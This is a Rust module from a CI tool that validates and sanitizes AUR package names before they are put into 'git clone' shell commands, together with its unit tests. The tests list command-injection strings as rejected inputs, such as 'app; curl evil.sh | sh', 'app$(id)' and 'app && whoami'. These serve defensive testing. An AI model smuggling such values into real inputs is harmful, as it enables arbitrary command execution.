//! AUR package name handling.
//!
//! The aur-release rule interpolates each package name straight into shell
//! commands that end up in the generated pipeline (`git clone
//! ssh://aur@aur.archlinux.org/<pkg>.git`), in a job holding the AUR SSH key.
//! The name comes from `cibox.ron`, from the origin remote in `.git/config`,
//! or from the project directory name — none of which is guaranteed to be a
//! well-formed package name.
//!
//! So every name is checked here before it can reach a command:
//! [`is_valid_package_name`] guards names the user wrote (a malformed one is
//! a config error, reported by `parse_config`), and [`coerce_package_name`]
//! folds whatever is left — the names cibox derived itself above all — into a
//! valid name, since the user never asked for that particular string.

/// Last-resort package name when nothing usable can be derived
pub const FALLBACK_NAME: &str = "app";

/// Longest name the AUR allows
const MAX_LEN: usize = 255;

/// Whether `name` is a valid AUR package name: lowercase alphanumerics and
/// `@._+-`, not starting with `-` or `.`. Stricter than pacman's pkgname
/// grammar — the AUR rejects uppercase.
pub fn is_valid_package_name(name: &str) -> bool {
    let bytes = name.as_bytes();
    !bytes.is_empty()
        && bytes.len() <= MAX_LEN
        && !matches!(bytes[0], b'-' | b'.')
        && bytes.iter().all(|&b| is_name_byte(b))
}

fn is_name_byte(b: u8) -> bool {
    b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'@' | b'.' | b'_' | b'+' | b'-')
}

/// The valid package name closest to `raw`: `raw` itself when it already is
/// one, otherwise a sanitized form — lowercased, with every run of characters
/// a name cannot hold replaced by a single `-` and the leftovers trimmed.
/// Falls back to [`FALLBACK_NAME`] when nothing usable is left.
pub fn coerce_package_name(raw: &str) -> String {
    if is_valid_package_name(raw) {
        return raw.to_string();
    }

    let mut sanitized = String::with_capacity(raw.len());
    for ch in raw.chars() {
        let ch = ch.to_ascii_lowercase();
        if ch.is_ascii() && is_name_byte(ch as u8) {
            sanitized.push(ch);
        } else if sanitized.ends_with(|c: char| c.is_ascii_alphanumeric()) {
            sanitized.push('-');
        }
    }
    // Only a leading `-` or `.` is forbidden; the trailing trim just drops
    // separators left over from collapsed runs ("my app " → "my-app")
    let sanitized = sanitized
        .trim_start_matches(['-', '.'])
        .trim_end_matches('-');
    // Trimming only touches the ends, so a long input can still be too long
    let sanitized = &sanitized[..sanitized.len().min(MAX_LEN)];

    if sanitized.is_empty() {
        return FALLBACK_NAME.to_string();
    }
    sanitized.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_plain_names_are_valid() {
        for name in [
            "app",
            "cibox",
            "goldboot-registry",
            "sandpolis-agent-git",
            "lib32-glibc",
            "python-requests",
            "c++",
            "zoom",
            "j2re1.4",
            "ttf-font_awesome",
            "pkg@provider",
        ] {
            assert!(is_valid_package_name(name), "{name}");
        }
    }

    #[test]
    fn test_shell_metacharacters_are_rejected() {
        // Anything that could break out of `git clone ssh://aur@.../<pkg>.git`
        for name in [
            "app; curl evil.sh | sh",
            "app && whoami",
            "app$(id)",
            "app `id`",
            "app\nrun: id",
            "app .",
            "'app'",
            "app\"",
            "$PKG",
            "app > /tmp/x",
        ] {
            assert!(!is_valid_package_name(name), "{name}");
        }
    }

    #[test]
    fn test_malformed_names_are_rejected() {
        for name in [
            "",
            "App",   // the AUR is lowercase-only
            "-app",  // must not start with - or .
            ".app",  //
            "my app",
            "owner/app",
            "café",
        ] {
            assert!(!is_valid_package_name(name), "{name}");
        }
    }

    #[test]
    fn test_long_names_are_rejected_but_coercible() {
        let long = "a".repeat(MAX_LEN + 1);
        assert!(!is_valid_package_name(&long));
        assert_eq!(coerce_package_name(&long), "a".repeat(MAX_LEN));
    }

    #[test]
    fn test_coerce_keeps_names_that_are_already_valid() {
        for name in ["app", "goldboot-registry", "c++", "pkg@provider"] {
            assert_eq!(coerce_package_name(name), name);
        }
    }

    #[test]
    fn test_coerce_normalizes_derived_names() {
        // The common cases: an uppercase repo name and a directory name
        assert_eq!(coerce_package_name("CiBox"), "cibox");
        assert_eq!(coerce_package_name("My Project"), "my-project");
        // Runs of unusable characters collapse instead of piling up
        assert_eq!(coerce_package_name("my   app"), "my-app");
        assert_eq!(coerce_package_name("-=app=-"), "app");
        assert_eq!(coerce_package_name("owner/app"), "owner-app");
        assert_eq!(coerce_package_name("café"), "caf");
    }

    #[test]
    fn test_coerce_output_is_always_a_valid_name() {
        for raw in [
            "repo; curl evil.sh | sh",
            "repo$(id)",
            "a b c",
            "",
            "///",
            "!!!",
            "..",
            "ПРИВЕТ",
            "app\nrun: id",
            "-app",
            ".app",
        ] {
            let coerced = coerce_package_name(raw);
            assert!(
                is_valid_package_name(&coerced),
                "{raw:?} coerced to {coerced:?}"
            );
        }
    }

    #[test]
    fn test_coerce_falls_back_when_nothing_usable_remains() {
        assert_eq!(coerce_package_name(""), FALLBACK_NAME);
        assert_eq!(coerce_package_name("///"), FALLBACK_NAME);
        assert_eq!(coerce_package_name("!!!"), FALLBACK_NAME);
    }
}
